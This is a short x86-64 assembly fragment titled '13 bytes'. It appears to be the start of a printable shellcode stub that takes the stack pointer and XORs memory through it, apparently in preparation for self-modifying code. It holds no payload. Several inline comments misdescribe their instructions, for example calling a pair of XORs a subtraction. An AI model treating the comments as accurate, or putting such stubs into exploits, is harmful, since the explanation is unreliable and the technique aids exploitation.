# 13 bytes

.text
.global _start
_start:
  pop %rax
  push %rsp                 # move pointer to %rsp into %rax
  pop %rax
  xor $0x65,%al            # subtract 0x10 from %rax
  xor $0x75,%al
  xor %rsi,(%rax)
  xor (%rax),%rsi          # move address to last instruction into %rax
